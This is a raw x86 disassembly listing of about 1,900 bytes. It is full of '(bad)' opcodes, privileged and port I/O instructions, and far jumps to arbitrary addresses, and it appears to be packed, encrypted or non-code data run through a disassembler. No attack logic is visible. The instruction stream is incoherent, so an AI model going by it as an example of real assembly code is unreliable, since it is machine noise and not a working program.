  413843:	clc    
  413844:	add    esp,DWORD PTR [eax+edi*1+0x2c2e09e2]
  41384b:	call   0x3354:0x1d663ee3
  413852:	dec    ebx
  413853:	fcom   QWORD PTR [esi+0x4af466f]
  413859:	cmp    ecx,DWORD PTR [esi-0x5f27ea64]
  41385f:	dec    eax
  413860:	or     BYTE PTR [esi+edx*2],0xef
  413864:	inc    edi
  413865:	popa   
  413866:	dec    edx
  413867:	xchg   edx,eax
  413868:	push   esp
  413869:	inc    edx
  41386a:	test   DWORD PTR [eax+eax*2-0x47434c23],0x856fa78d
  413875:	(bad)
  413878:	adc    al,0xe5
  41387a:	pop    DWORD PTR [ebp-0x55c26fe2]
  413880:	push   edi
  413881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413882:	stos   BYTE PTR es:[edi],al
  413883:	(bad)  
  413884:	mov    edx,0x7fd0fa2d
  413889:	sti    
  41388a:	adc    BYTE PTR [edx-0x34],ch
  41388d:	jl     0x4138f2
  41388f:	dec    esi
  413890:	cmp    al,0x90
  413892:	nop
  413893:	push   esi
  413894:	sub    ebp,ecx
  413896:	push   edx
  413897:	add    bl,BYTE PTR [edi-0x1f]
  41389a:	and    al,0x3e
  41389c:	xor    al,0x49
  41389e:	in     al,0x3c
  4138a0:	in     eax,dx
  4138a1:	stos   BYTE PTR es:[edi],al
  4138a2:	xchg   esi,eax
  4138a3:	or     esp,eax
  4138a5:	pop    ds
  4138a6:	lods   al,BYTE PTR ds:[esi]
  4138a7:	sar    DWORD PTR [edx+0xc28e7ae],0x70
  4138ae:	fisubr DWORD PTR [esi+0x23d0c5fb]
  4138b4:	mov    ah,0xa4
  4138b6:	pop    ss
  4138b7:	lock add esp,DWORD PTR [eax]
  4138ba:	push   ecx
  4138bb:	dec    esi
  4138bc:	inc    ebp
  4138bd:	fimul  DWORD PTR [esi+0x3b]
  4138c0:	mov    WORD PTR es:[esi-0x7d],es
  4138c4:	mov    al,ds:0x1817306c
  4138c9:	add    BYTE PTR [eax],ch
  4138cb:	(bad)  
  4138cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138cd:	inc    esp
  4138ce:	push   eax
  4138cf:	shr    BYTE PTR [eax+0x12f53e30],cl
  4138d5:	mov    edi,0x18215099
  4138da:	adc    cl,BYTE PTR [edx]
  4138dc:	xor    eax,0xaf83bfeb
  4138e1:	push   eax
  4138e2:	into   
  4138e3:	mov    eax,ebp
  4138e5:	adc    ebx,DWORD PTR [eax-0x31b1988b]
  4138eb:	in     al,0x5
  4138ed:	xchg   esp,eax
  4138ee:	(bad)  
  4138f0:	dec    esp
  4138f1:	xchg   esp,eax
  4138f2:	xor    ecx,ebp
  4138f4:	inc    edx
  4138f5:	xchg   esi,eax
  4138f6:	inc    ecx
  4138f7:	push   ecx
  4138f8:	add    al,bl
  4138fa:	push   ebp
  4138fb:	sub    cl,BYTE PTR [ecx]
  4138fd:	or     ch,ah
  4138ff:	and    al,0x24
  413901:	hlt    
  413902:	push   ecx
  413903:	imul   ebx,ecx,0x60
  413906:	cmp    bh,dl
  413908:	cmp    dh,al
  41390a:	inc    edx
  41390b:	scas   eax,DWORD PTR es:[edi]
  41390c:	iret   
  41390d:	cmp    eax,0x430792ca
  413912:	adc    BYTE PTR [esi+eax*4+0x32dd68fb],dl
  413919:	test   eax,0xed3b328b
  41391e:	pop    ds
  41391f:	mov    ecx,0xb1ffeb37
  413924:	push   0x11
  413926:	add    DWORD PTR [edx],ebx
  413928:	cs jge 0x413961
  41392b:	push   ebp
  41392c:	mov    ch,0xba
  41392e:	mov    BYTE PTR [ecx+0x60],bh
  413931:	sbb    al,0x4b
  413933:	shl    DWORD PTR [edx-0x1a7fd86e],cl
  413939:	inc    esp
  41393a:	and    cl,BYTE PTR [edx]
  41393c:	pop    es
  41393d:	in     al,0xf2
  41393f:	or     esp,eax
  413941:	dec    ebx
  413942:	pop    ecx
  413943:	shld   DWORD PTR [ebx+0x67],edi,0x1a
  413948:	xchg   edx,eax
  413949:	lock clc 
  41394b:	lahf   
  41394c:	fucomp st(6)
  41394e:	sub    eax,0xeb219974
  413953:	icebp  
  413954:	lahf   
  413955:	add    esi,DWORD PTR [edx-0x46f8b381]
  41395b:	std    
  41395c:	jmp    0x413934
  41395e:	or     al,0x5
  413960:	aam    0xf8
  413962:	cli    
  413963:	aam    0xc6
  413965:	out    dx,al
  413966:	sub    DWORD PTR ds:0x3da8bf1,edi
  41396c:	pop    ds
  41396d:	adc    cl,BYTE PTR [si+0x33]
  413971:	cmp    edx,DWORD PTR [ebx-0x3fe116f0]
  413977:	sbb    eax,0x1090a3ed
  41397c:	fxtract 
  41397e:	dec    esp
  41397f:	inc    edi
  413980:	test   DWORD PTR [ebp-0x5],esp
  413983:	(bad)  
  413984:	mov    esi,0xa64458e
  413989:	ja     0x41399d
  41398b:	imul   esi,ebp,0x1e
  41398e:	push   es
  41398f:	cld    
  413990:	add    esi,esi
  413992:	adc    cl,cl
  413994:	out    0xfa,al
  413996:	push   0xf3c2c2f1
  41399b:	inc    eax
  41399c:	lods   eax,DWORD PTR ds:[esi]
  41399d:	(bad)  
  41399f:	ret    0x3868
  4139a2:	gs clc 
  4139a4:	shr    BYTE PTR [ebx-0x262caef3],0x56
  4139ab:	jecxz  0x4139f3
  4139ad:	xor    DWORD PTR [esi],esp
  4139af:	ja     0x413994
  4139b1:	hlt    
  4139b2:	add    ebp,DWORD PTR [ebx+0x1c]
  4139b5:	hlt    
  4139b6:	inc    eax
  4139b7:	push   edx
  4139b8:	mov    edi,0x1aaccce9
  4139bd:	cs pop ebp
  4139bf:	inc    esi
  4139c0:	dec    esi
  4139c1:	sbb    DWORD PTR [edi+ebp*4-0x328e1490],edi
  4139c8:	cwde   
  4139c9:	pop    edi
  4139ca:	mov    esi,0x7e7e2588
  4139cf:	pushf  
  4139d0:	push   ebp
  4139d1:	in     al,dx
  4139d2:	dec    ebp
  4139d3:	mov    ch,0x65
  4139d5:	or     al,0x7e
  4139d7:	xor    eax,DWORD PTR [ebp+0x151e189a]
  4139dd:	sahf   
  4139de:	push   ecx
  4139df:	xor    al,0xb2
  4139e1:	cdq    
  4139e2:	xchg   edx,eax
  4139e3:	pop    ds
  4139e4:	mov    ah,0x9f
  4139e6:	jg     0x4139d9
  4139e8:	outs   dx,BYTE PTR ds:[esi]
  4139e9:	adc    al,0xed
  4139eb:	pop    esi
  4139ec:	pop    eax
  4139ed:	popa   
  4139ee:	repnz mov ds:0x545edccf,ax
  4139f5:	pop    es
  4139f6:	adc    cl,BYTE PTR [ebx-0x59]
  4139f9:	pop    ecx
  4139fa:	mov    esp,0x500771f1
  4139ff:	mul    DWORD PTR [ebp-0xf]
  413a02:	iret   
  413a03:	daa    
  413a04:	and    DWORD PTR [edi+0x21],edx
  413a07:	gs xor al,0xe9
  413a0a:	push   esi
  413a0b:	sbb    al,0x84
  413a0d:	daa    
  413a0e:	js     0x413a27
  413a10:	push   eax
  413a11:	push   cs
  413a12:	pop    ecx
  413a13:	bound  esi,QWORD PTR [ecx+edi*2-0x6]
  413a17:	jnp    0x4139b5
  413a19:	sti    
  413a1a:	pop    es
  413a1b:	retf   0x9b7b
  413a1e:	gs xchg edx,eax
  413a20:	out    dx,al
  413a21:	cdq    
  413a22:	mov    ch,cl
  413a24:	ins    DWORD PTR es:[edi],dx
  413a25:	push   esp
  413a26:	unpckhps xmm3,XMMWORD PTR [ebp+esi*1+0x57]
  413a2b:	out    0x6b,al
  413a2d:	inc    esi
  413a2e:	cmp    DWORD PTR [ecx+0xff4dfb8],0xffffffc8
  413a35:	mov    ebp,0xd6727a10
  413a3a:	aam    0x54
  413a3c:	das    
  413a3d:	add    DWORD PTR [ebx],edi
  413a3f:	or     bl,BYTE PTR [esi+eiz*8-0x61]
  413a43:	mov    dl,bh
  413a45:	js     0x413a6a
  413a47:	dec    eax
  413a48:	mov    eax,ds:0x557a99a6
  413a4d:	pop    esp
  413a4e:	sbb    esp,DWORD PTR [edx]
  413a50:	dec    esi
  413a51:	dec    edi
  413a52:	test   DWORD PTR [edi-0x44],esi
  413a55:	fidivr WORD PTR ds:0x491b7120
  413a5b:	pusha  
  413a5c:	shl    ah,0x68
  413a5f:	lds    ebp,FWORD PTR ds:[edx+esi*1+0x64]
  413a64:	add    BYTE PTR [esi],bl
  413a66:	pushf  
  413a67:	and    bl,BYTE PTR [edi+0x651c5af]
  413a6d:	arpl   WORD PTR [esi+ecx*2+0x613429f9],di
  413a74:	sbb    edx,edx
  413a76:	or     ecx,edx
  413a78:	xchg   ecx,eax
  413a79:	out    dx,al
  413a7a:	test   esi,esp
  413a7c:	mov    al,0x9d
  413a7e:	dec    edi
  413a7f:	jg     0x413a27
  413a81:	gs rol dh,cl
  413a84:	jl     0x413a8e
  413a86:	and    DWORD PTR [edx],0x61f8cbd7
  413a8c:	pop    es
  413a8d:	ss fucomi st,st(5)
  413a90:	jne    0x413ab7
  413a92:	pop    edx
  413a93:	push   0xae6ff8dc
  413a98:	cmp    DWORD PTR [edi+0x3c980cca],ebx
  413a9e:	cwde   
  413a9f:	int    0x1a
  413aa1:	(bad)  
  413aa3:	(bad)  
  413aa6:	out    dx,al
  413aa7:	cmp    dh,BYTE PTR [eax-0x49]
  413aaa:	xchg   edx,eax
  413aab:	or     eax,0xd231eda8
  413ab0:	pop    eax
  413ab1:	arpl   WORD PTR [ecx+0x1f959e63],sp
  413ab7:	mov    al,0x5e
  413ab9:	(bad)  
  413aba:	cmc    
  413abb:	dec    eax
  413abc:	mov    eax,ds:0xc275a095
  413ac1:	scas   al,BYTE PTR es:[edi]
  413ac2:	test   DWORD PTR [edx-0x1a59325f],0x161f1e00
  413acc:	cmp    edx,esi
  413ace:	push   esi
  413acf:	cs iret 
  413ad1:	and    al,0x3b
  413ad3:	inc    esi
  413ad4:	push   ecx
  413ad5:	jecxz  0x413ab8
  413ad7:	jns    0x413b0b
  413ad9:	ret    0xbadc
  413adc:	and    BYTE PTR [edx-0x6],ah
  413adf:	adc    DWORD PTR [edi+0x34],ebp
  413ae2:	xchg   DWORD PTR [edi],edi
  413ae4:	repz push cs
  413ae6:	or     eax,0x3bd59244
  413aeb:	gs mov eax,0x33b86719
  413af1:	test   eax,0xea853ca
  413af6:	(bad)  
  413af7:	mov    ds:0xae4fcc6,eax
  413afc:	and    DWORD PTR [ecx-0x7e16cb78],0x30
  413b03:	xchg   DWORD PTR [ebx],esp
  413b05:	outs   dx,BYTE PTR ds:[esi]
  413b06:	add    DWORD PTR [edi+ecx*4-0x607cb9b3],ebp
  413b0d:	mov    ebp,0xfcb70c83
  413b12:	lods   eax,DWORD PTR ds:[esi]
  413b13:	jecxz  0x413b8d
  413b15:	sahf   
  413b16:	lods   al,BYTE PTR ds:[esi]
  413b17:	ds into 
  413b19:	outs   dx,DWORD PTR ds:[esi]
  413b1a:	sahf   
  413b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b1c:	mov    ds:0x51a743f2,al
  413b21:	push   es
  413b22:	fwait
  413b23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b24:	test   DWORD PTR [ecx-0x1b],edx
  413b27:	fistp  WORD PTR [esi]
  413b29:	pushf  
  413b2a:	add    esp,DWORD PTR [ecx]
  413b2c:	jb     0x413aec
  413b2e:	(bad)  
  413b2f:	inc    ebx
  413b30:	ja     0x413ae9
  413b32:	inc    ecx
  413b33:	mov    ds:0xd4040975,eax
  413b38:	rcr    DWORD PTR [eax-0x47],cl
  413b3b:	ret    0x5254
  413b3e:	fwait
  413b3f:	mov    eax,ds:0xc598ceb4
  413b44:	imul   BYTE PTR [edi-0x1f]
  413b47:	or     ebx,ebp
  413b49:	inc    edi
  413b4a:	add    eax,0xe6924c4a
  413b4f:	sbb    ch,BYTE PTR [esi+0x5820eda8]
  413b55:	push   es
  413b56:	cmp    bl,BYTE PTR [esi+0x44]
  413b59:	pop    ds
  413b5a:	add    ebx,DWORD PTR [eax]
  413b5c:	fistp  QWORD PTR [eax+0x7e4f3c8]
  413b62:	jmp    0x648b0c47
  413b67:	test   al,0x48
  413b69:	lods   eax,DWORD PTR ds:[esi]
  413b6a:	mov    ds:0xd126faf,eax
  413b6f:	pop    ds
  413b70:	sbb    al,0xc0
  413b72:	push   ds
  413b73:	sub    esi,ecx
  413b75:	and    al,0x45
  413b77:	xchg   esp,eax
  413b78:	out    0x35,eax
  413b7a:	outs   dx,DWORD PTR ds:[esi]
  413b7b:	outs   dx,DWORD PTR ds:[esi]
  413b7c:	addr16 test eax,0xfd6c3d06
  413b82:	jbe    0x413b44
  413b84:	and    eax,0x79f5b624
  413b89:	rcr    DWORD PTR [ecx+0x4cc44b83],0xe
  413b90:	hlt    
  413b91:	xor    edi,0xffffffda
  413b94:	cld    
  413b95:	call   0x4e92:0xd3254e3f
  413b9c:	xchg   edi,eax
  413b9d:	inc    ecx
  413b9e:	popf   
  413b9f:	mov    eax,ds:0xdbc43c0e
  413ba4:	repz xchg ecx,eax
  413ba6:	retf   
  413ba7:	add    eax,0x60d86d9b
  413bac:	xor    ah,BYTE PTR [esi]
  413bae:	dec    eax
  413baf:	cmp    DWORD PTR [esp+ebp*4-0x70e16c43],edi
  413bb6:	add    esi,DWORD PTR [edi-0x5f67c6a2]
  413bbc:	in     eax,dx
  413bbd:	inc    esi
  413bbe:	repz loop 0x413b77
  413bc1:	or     BYTE PTR [eax],bl
  413bc3:	jne    0x413b91
  413bc5:	or     DWORD PTR [ecx],0x65c9d33
  413bcb:	mov    eax,ds:0x624765a0
  413bd0:	aam    0xba
  413bd2:	mov    ch,BYTE PTR [edx]
  413bd4:	push   es
  413bd5:	pop    ebx
  413bd6:	push   ecx
  413bd7:	scas   al,BYTE PTR es:[edi]
  413bd8:	push   cs
  413bd9:	cmp    esi,DWORD PTR [eax]
  413bdb:	mov    ah,0x26
  413bdd:	les    ecx,FWORD PTR gs:[edx+0x24a8fcf5]
  413be4:	fmul   DWORD PTR [ebx-0xc]
  413be7:	jmp    0x5a682948
  413bec:	push   edi
  413bed:	scas   eax,DWORD PTR es:[edi]
  413bee:	jmp    0x413c21
  413bf0:	sub    DWORD PTR [edi+0x47cc3247],0xffffffa2
  413bf7:	mov    edx,edi
  413bf9:	mov    ch,0x4e
  413bfb:	add    eax,0x31fd7b96
  413c00:	mov    ecx,cs
  413c02:	div    DWORD PTR [edi]
  413c04:	sar    BYTE PTR [ebp+edx*4-0x66],cl
  413c08:	(bad)  [esi+0x2a9e8eb1]
  413c0e:	cli    
  413c0f:	adc    al,0x93
  413c11:	xor    al,BYTE PTR [ebx]
  413c13:	push   cs
  413c14:	inc    edi
  413c15:	jae    0x413c8c
  413c17:	test   BYTE PTR [ebp-0x72],ah
  413c1a:	jnp    0x413c18
  413c1c:	inc    edi
  413c1d:	dec    eax
  413c1e:	inc    eax
  413c1f:	or     al,0xb0
  413c21:	dec    eax
  413c22:	inc    ebp
  413c23:	jns    0x413ba9
  413c25:	xchg   edx,eax
  413c26:	into   
  413c27:	fwait
  413c28:	aam    0x8d
  413c2a:	xor    BYTE PTR [ebp+0x28],bh
  413c2d:	pusha  
  413c2e:	and    DWORD PTR [ebp+0xe9f1aee],eax
  413c34:	aaa    
  413c35:	(bad)  
  413c36:	push   edi
  413c37:	dec    ecx
  413c38:	add    ah,BYTE PTR [ebp-0x26]
  413c3b:	xor    esp,DWORD PTR [ecx-0x1f]
  413c3e:	push   ecx
  413c3f:	pop    ebx
  413c40:	imul   esp,DWORD PTR [ebx-0x63e92458],0x74493acf
  413c4a:	adc    al,0x25
  413c4c:	sti    
  413c4d:	es sbb dh,al
  413c50:	mov    esi,0xd7659e35
  413c55:	push   ebx
  413c56:	(bad)  
  413c57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c58:	(bad)  
  413c59:	out    0x73,eax
  413c5b:	gs xor eax,0x8090cf9f
  413c61:	add    al,0xfc
  413c63:	jle    0x413c56
  413c65:	push   edx
  413c66:	cmp    BYTE PTR [edi],ch
  413c68:	adc    eax,0x6e0f5aab
  413c6d:	and    DWORD PTR [edx],edi
  413c6f:	stos   DWORD PTR es:[edi],eax
  413c70:	mov    DWORD PTR [esi+0x9],ecx
  413c73:	in     eax,0x9b
  413c75:	pop    edx
  413c76:	test   al,0xb5
  413c78:	push   edi
  413c79:	and    al,0x31
  413c7b:	jae    0x413c16
  413c7d:	xor    BYTE PTR [esi],0x2d
  413c80:	pop    ss
  413c81:	in     al,dx
  413c82:	ins    BYTE PTR es:[edi],dx
  413c83:	cmp    al,0x14
  413c85:	or     eax,0x5bac920a
  413c8a:	sbb    BYTE PTR [ecx-0x3363fdda],dl
  413c90:	dec    eax
  413c91:	mov    al,0x16
  413c93:	adc    eax,0xc51ea71f
  413c98:	jle    0x413cb5
  413c9a:	scas   eax,DWORD PTR es:[edi]
  413c9b:	jmp    0xde22:0xdd0814a5
  413ca2:	out    dx,eax
  413ca3:	adc    al,0xd
  413ca5:	fisttp DWORD PTR [ecx+0x621abd7a]
  413cab:	lods   al,BYTE PTR ds:[esi]
  413cac:	test   BYTE PTR [edx+0x67],ch
  413caf:	xchg   edi,eax
  413cb0:	dec    ebp
  413cb1:	mov    al,0x98
  413cb3:	aas    
  413cb4:	jle    0x413c9f
  413cb6:	cmc    
  413cb7:	mov    edi,0x544169c3
  413cbc:	test   al,0xa0
  413cbe:	inc    edi
  413cbf:	push   edi
  413cc0:	(bad)  
  413cc2:	rcl    DWORD PTR [esp+edi*2],0xd4
  413cc6:	js     0x413cc9
  413cc8:	pop    esp
  413cc9:	cld    
  413cca:	sub    al,0xc8
  413ccc:	cmp    al,0x6c
  413cce:	das    
  413ccf:	dec    eax
  413cd0:	dec    edx
  413cd1:	sbb    ebp,DWORD PTR [ebx]
  413cd3:	ja     0x413cb8
  413cd5:	bound  eax,QWORD PTR [edx+edi*8-0x122cce1e]
  413cdc:	mov    ds:0xa001bf39,eax
  413ce1:	repnz and edx,DWORD PTR [ebx+edi*2-0x4]
  413ce6:	mov    eax,0x21b14e1f
  413ceb:	(bad)  
  413ced:	call   0x25b5:0x2b1371f4
  413cf4:	inc    edx
  413cf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cf6:	push   esi
  413cf7:	ret    
  413cf8:	add    eax,0xc385f6ba
  413cfd:	cmc    
  413cfe:	cmp    edi,0xf51f921b
  413d04:	cli    
  413d05:	repnz lahf 
  413d07:	jg     0x413c8e
  413d09:	popf   
  413d0a:	sub    BYTE PTR [ebp-0xb47cf8d],dl
  413d10:	pusha  
  413d11:	cmp    esp,ebp
  413d13:	and    al,0xeb
  413d15:	or     BYTE PTR [eax+eax*4],ah
  413d18:	sahf   
  413d19:	je     0x413d26
  413d1b:	test   DWORD PTR [edi],ebp
  413d1d:	mov    dl,0x76
  413d1f:	jb     0x413d0d
  413d21:	and    eax,edx
  413d23:	mov    ecx,0x3313b3f3
  413d28:	(bad)  
  413d29:	mov    esi,0xc2608b29
  413d2e:	scas   eax,DWORD PTR es:[edi]
  413d2f:	adc    BYTE PTR [esi],cl
  413d31:	aad    0xb2
  413d33:	ss cdq 
  413d35:	je     0x413ce1
  413d37:	pop    ecx
  413d39:	aam    0xf0
  413d3b:	push   esp
  413d3c:	aam    0xe2
  413d3e:	pop    ss
  413d3f:	inc    ecx
  413d40:	push   ebp
  413d41:	aam    0x18
  413d43:	(bad)  
  413d44:	sbb    DWORD PTR [eax+0x29669c2e],ebx
  413d4a:	mov    DWORD PTR [ebp+0x7cb5b2f8],esi
  413d50:	pop    ebx
  413d51:	cld    
  413d52:	bound  ebp,QWORD PTR [edx-0x2de74f0f]
  413d58:	push   esp
  413d59:	sbb    DWORD PTR [edx-0x35],esi
  413d5c:	sub    DWORD PTR [esi+0x4b],edx
  413d5f:	sub    al,0x79
  413d61:	jbe    0x413d1d
  413d63:	sbb    BYTE PTR [eax+0x15],al
  413d66:	sub    BYTE PTR [edi+0x39fa4dc2],0x37
  413d6d:	enter  0x7730,0x17
  413d71:	ret    
  413d72:	in     al,dx
  413d73:	jns    0x413d50
  413d75:	pop    esp
  413d76:	and    dl,BYTE PTR [eax+0x5c]
  413d79:	and    al,0xdf
  413d7b:	ds fwait
  413d7d:	sbb    DWORD PTR [ebx+0x34],ebp
  413d80:	stos   BYTE PTR es:[edi],al
  413d81:	imul   esp,DWORD PTR ds:0xa76826b9,0xffffffad
  413d88:	inc    ebp
  413d89:	stc    
  413d8a:	cmp    al,0x9c
  413d8c:	das    
  413d8d:	jmp    0x9d24c56e
  413d92:	or     ch,ah
  413d94:	fs js  0x413d65
  413d97:	pop    esp
  413d98:	sub    eax,0xef063d2d
  413d9d:	or     BYTE PTR [ecx+0x38fe554],dh
  413da3:	out    0xec,eax
  413da5:	sahf   
  413da6:	scas   al,BYTE PTR es:[edi]
  413da7:	rep lods al,BYTE PTR ds:[esi]
  413da9:	cs (bad) 
  413dab:	fwait
  413dac:	pop    ebx
  413dad:	rcl    ch,0xc1
  413db0:	popf   
  413db1:	jecxz  0x413da7
  413db3:	sub    eax,DWORD PTR ds:[edi]
  413db6:	pop    es
  413db7:	stos   DWORD PTR es:[edi],eax
  413db8:	scas   eax,DWORD PTR es:[edi]
  413db9:	mov    ?,WORD PTR [ebx]
  413dbb:	icebp  
  413dbc:	sub    eax,DWORD PTR [ebx+0xe]
  413dbf:	test   al,0x68
  413dc1:	add    DWORD PTR [ebx-0x55],edi
  413dc4:	and    ch,0x6f
  413dc7:	xor    DWORD PTR [edi+ebp*4+0x194e078b],0x3e8c7c7
  413dd2:	lahf   
  413dd3:	dec    ebp
  413dd4:	sub    al,BYTE PTR [eax+0x1e8e3c01]
  413dda:	xchg   ebx,eax
  413ddb:	std    
  413ddc:	xor    al,0x58
  413dde:	jns    0x413e47
  413de0:	push   0xfffffff0
  413de2:	mov    ds:0x57e1ff0c,eax
  413de7:	fsub   st,st(6)
  413de9:	(bad)
  413dec:	out    0xb6,al
  413dee:	retf   
  413def:	repnz mov al,0xc6
  413df2:	or     ah,al
  413df4:	imul   esi,DWORD PTR cs:[ebp-0x5a],0x56065ad
  413dfc:	fdivr  st,st(7)
  413dfe:	inc    edx
  413dff:	adc    BYTE PTR [edi],ah
  413e01:	mov    ecx,0x9a5dd2f6
  413e06:	add    edx,edi
  413e08:	add    BYTE PTR [edi],bl
  413e0a:	xchg   esi,eax
  413e0b:	nop
  413e0c:	push   es
  413e0d:	pop    ss
  413e0e:	jl     0x413db2
  413e10:	imul   esi,edx,0xef8c123a
  413e16:	scas   al,BYTE PTR es:[edi]
  413e17:	mov    bh,0x8
  413e19:	jbe    0x413e19
  413e1b:	mov    edx,0x9e90f91a
  413e20:	and    ebx,DWORD PTR [ecx-0x28]
  413e23:	hlt    
  413e24:	not    BYTE PTR [eax-0x536e6e2b]
  413e2a:	test   eax,0x518edf9f
  413e2f:	jmp    0x9294:0x5931e27b
  413e36:	dec    edi
  413e37:	daa    
  413e38:	push   ebx
  413e39:	cmp    eax,0xeb76a8c3
  413e3e:	jns    0x413e47
  413e40:	je     0x413e05
  413e42:	or     eax,0xe9d6b30a
  413e47:	pop    esi
  413e48:	cmc    
  413e49:	add    eax,0x4d424ede
  413e4e:	mov    BYTE PTR [ebp+0x49d900c4],ah
  413e54:	push   ds
  413e55:	fbld   TBYTE PTR [esi-0x6e]
  413e58:	jp     0x413ddf
  413e5a:	dec    ebp
  413e5b:	loopne 0x413e2f
  413e5d:	sub    BYTE PTR [ecx+0x7f],bl
  413e60:	push   es
  413e61:	mov    DWORD PTR [ecx-0x159c7919],ebx
  413e67:	xchg   edi,eax
  413e68:	inc    ebp
  413e69:	sub    al,0xaa
  413e6b:	mov    BYTE PTR [eax+eiz*4+0x276c0b38],cl
  413e72:	mov    fs,WORD PTR [edx]
  413e74:	imul   ebx,DWORD PTR [ebx],0x57
  413e77:	push   ebx
  413e78:	xor    BYTE PTR [esi],0xfe
  413e7b:	inc    ebp
  413e7c:	inc    edi
  413e7d:	lahf   
  413e7e:	imul   ebx,ebx,0x8dab8810
  413e84:	mov    al,ds:0xf72b3109
  413e89:	xchg   eax,ebx
  413e8b:	cmp    eax,0xeeadc2da
  413e90:	es mov ebx,0xb49bc07c
  413e96:	leave  
  413e97:	cld    
  413e98:	aaa    
  413e99:	aad    0x2e
  413e9b:	(bad)  
  413e9c:	jle    0x413e71
  413e9e:	cld    
  413e9f:	mov    edi,0x341a7b7f
  413ea4:	inc    ebx
  413ea5:	enter  0xb1a0,0xd2
  413ea9:	ret    0x8aba
  413eac:	popa   
  413ead:	dec    edi
  413eae:	scas   al,BYTE PTR es:[edi]
  413eaf:	cli    
  413eb0:	icebp  
  413eb1:	sbb    eax,0xdb88ab9f
  413eb6:	int3   
  413eb7:	dec    ebp
  413eb8:	sbb    BYTE PTR [eax-0x45ff5219],dh
  413ebe:	jge    0x413ec6
  413ec0:	jne    0x413ee8
  413ec2:	sub    dl,BYTE PTR [edx]
  413ec4:	jo     0x413ebb
  413ec6:	nop
  413ec7:	jno    0x413f0c
  413ec9:	pop    edi
  413eca:	les    esi,FWORD PTR [ebx-0x70]
  413ecd:	out    dx,eax
  413ece:	inc    ebp
  413ecf:	ins    BYTE PTR es:[edi],dx
  413ed0:	std    
  413ed1:	cmp    ch,al
  413ed3:	pushf  
  413ed4:	out    dx,eax
  413ed5:	mov    ecx,0xbd134d2e
  413eda:	mov    ds:0xa02c239e,eax
  413edf:	into   
  413ee0:	dec    esp
  413ee1:	mov    ebp,0x2e4662ba
  413ee6:	dec    ecx
  413ee7:	push   ss
  413ee8:	sbb    BYTE PTR [edx+0x2440cac6],dl
  413eee:	cmp    DWORD PTR [ebp-0x4f],0x4ad0db2c
  413ef5:	test   DWORD PTR [edx+0x230b1cf9],esi
  413efb:	sahf   
  413efc:	pop    ds
  413efd:	nop
  413efe:	test   eax,0x8735bea0
  413f03:	in     al,0xc1
  413f05:	sub    BYTE PTR [esi+0x45],0xdd
  413f09:	dec    eax
  413f0a:	inc    ebp
  413f0b:	xlat   BYTE PTR ds:[ebx]
  413f0c:	adc    al,0xf3
  413f0e:	stos   DWORD PTR es:[edi],eax
  413f0f:	add    DWORD PTR [ebp+0x7b],esp
  413f12:	adc    DWORD PTR [edi-0x61],0x80c30f19
  413f19:	mov    bl,0xdb
  413f1b:	fisub  WORD PTR [ebx-0x6fa2d66f]
  413f21:	push   eax
  413f22:	mov    dh,0xed
  413f24:	repz adc WORD PTR [ecx+0x2961dead],ax
  413f2c:	xchg   BYTE PTR [ebx+0x62a5e01c],dl
  413f32:	rcl    esp,cl
  413f34:	jns    0x413ef5
  413f36:	mov    al,ds:0x97af5399
  413f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f3c:	aas    
  413f3d:	out    dx,eax
  413f3e:	push   ebp
  413f3f:	or     eax,0x76184d0f
  413f44:	loop   0x413f81
  413f46:	push   ebp
  413f47:	pop    ss
  413f48:	pop    esp
  413f49:	pop    gs
  413f4b:	shl    edx,cl
  413f4d:	ror    DWORD PTR [ebp+esi*2-0x2c43649a],cl
  413f54:	je     0x413f86
  413f56:	jnp    0x413f1c
  413f58:	and    eax,0x2d7c833b
  413f5d:	sbb    dl,0x58
  413f60:	daa    
  413f61:	aaa    
  413f62:	mov    bh,0xf1
  413f64:	in     eax,dx
  413f65:	aas    
  413f66:	jle    0x413fb0
  413f68:	cs mov edx,0x14d0837c
  413f6e:	xor    al,0x11
  413f70:	jge    0x413f25
  413f72:	out    0x91,al
  413f74:	push   ecx
  413f75:	add    al,0x39
  413f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f78:	inc    eax
  413f79:	sub    al,al
  413f7b:	jle    0x413f37
  413f7d:	dec    edx
  413f7e:	aaa    
  413f7f:	inc    ecx
  413f80:	adc    BYTE PTR [ebp+0x2b],dh
  413f83:	mov    dl,BYTE PTR [ecx-0x2e]
  413f86:	test   DWORD PTR [ebx-0x1],ebp
  413f89:	adc    eax,0x8483e70a
  413f8e:	mov    edx,eax
  413f90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f91:	pop    edi
  413f92:	rcl    BYTE PTR [eax+ebp*4-0x56263377],cl
  413f99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f9a:	aaa    
  413f9b:	pop    esp
  413f9c:	addr16 fs icebp 
  413f9f:	(bad)  
  413fa0:	pop    ebx
  413fa1:	mov    dl,BYTE PTR [ebx]
  413fa3:	out    dx,eax
  413fa4:	xchg   ah,ah
  413fa6:	push   ds
  413fa7:	add    DWORD PTR [eax],0xffffff8d
  413faa:	xor    dh,dh
  413fac:	fdivr  QWORD PTR [ebx]
  413fae:	pop    edi
  413faf:	fidivr DWORD PTR [ebx-0x5d]
  413fb2:	retf   
  413fb3:	and    ch,bh
  413fb5:	sbb    esp,0x82c9891b
  413fbb:	add    al,0x4e
  413fbd:	xlat   BYTE PTR ds:[ebx]
  413fbe:	repnz mov edx,0x5265e736
  413fc4:	stos   DWORD PTR es:[edi],eax
  413fc5:	test   al,0x67
  413fc7:	inc    ebp
  413fc8:	pop    ss
  413fc9:	das    
  413fca:	dec    eax
  413fcb:	pop    edx
  413fcc:	aas    
  413fcd:	or     dh,bh
  413fcf:	retf   
  413fd0:	cld    
  413fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fd2:	shl    DWORD PTR [edx-0x51a84323],cl
  413fd8:	push   0xffffff97
  413fda:	mov    ebp,0x60e9384a
  413fdf:	(bad)  
  413fe0:	loope  0x413fd4
  413fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fe3:	rcr    DWORD PTR [esp+ebx*8-0x2b],1
